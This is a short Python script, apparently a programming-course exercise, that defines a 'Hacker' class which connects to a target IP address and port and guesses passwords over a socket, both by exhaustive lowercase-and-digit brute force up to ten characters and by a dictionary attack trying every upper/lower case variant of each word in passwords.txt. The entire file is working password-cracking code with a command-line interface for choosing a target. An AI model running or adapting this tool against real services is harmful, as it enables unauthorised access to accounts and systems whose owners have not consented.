# write your code here
import argparse
import itertools
import socket
import string

CHARSET = string.ascii_lowercase + string.digits


class Hacker:

    def __init__(self, ip_address, port, max_size=10):
        self.ip_address = ip_address
        self.port = port
        self.max_size = max_size
        self.sock = None

    def __enter__(self):
        self.sock = socket.socket()
        self.sock.connect((self.ip_address, self.port))
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.sock.close()

    @staticmethod
    def _gen_upper_lower_combination(text):
        for chars in itertools.product(*({char.upper(), char.lower()} for char in text)):
            yield "".join(chars)

    def hack(self, algo='brute'):
        self.hack_brute_dict('passwords.txt')

    def hack_brute_dict(self, password_file):
        with open(password_file, 'r') as f:
            stop = False
            for password in f:
                password = password.strip()
                for new_password in self._gen_upper_lower_combination(password):
                    self.sock.send(new_password.encode('utf-8'))
                    msg = self.sock.recv(1024).decode()
                    if msg == "Connection success!":
                        stop = True
                        print(new_password)
                        break
                    if msg == "Too many attempts":
                        stop = True
                        break
                if stop:
                    break

    def hack_brute(self):
        for password in itertools.chain(*(itertools.product(CHARSET, repeat=n) for n in range(1, self.max_size+1))):
            password = "".join(password)
            self.sock.send(password.encode('utf8'))
            msg = self.sock.recv(1024).decode('utf-8')
            if msg == "Connection success!":
                print(password)
                break
            if msg == "Too many attempts":
                break


def main():
    my_parser = argparse.ArgumentParser(description="Password Hacker:")
    my_parser.add_argument("ip_address", type=str, help="target IP address to hack password")
    my_parser.add_argument('port', type=int, help="target port associated with the IP address")

    args = my_parser.parse_args()

    with Hacker(ip_address=args.ip_address, port=args.port) as hacker:
        hacker.hack()


if __name__ == '__main__':
    main()

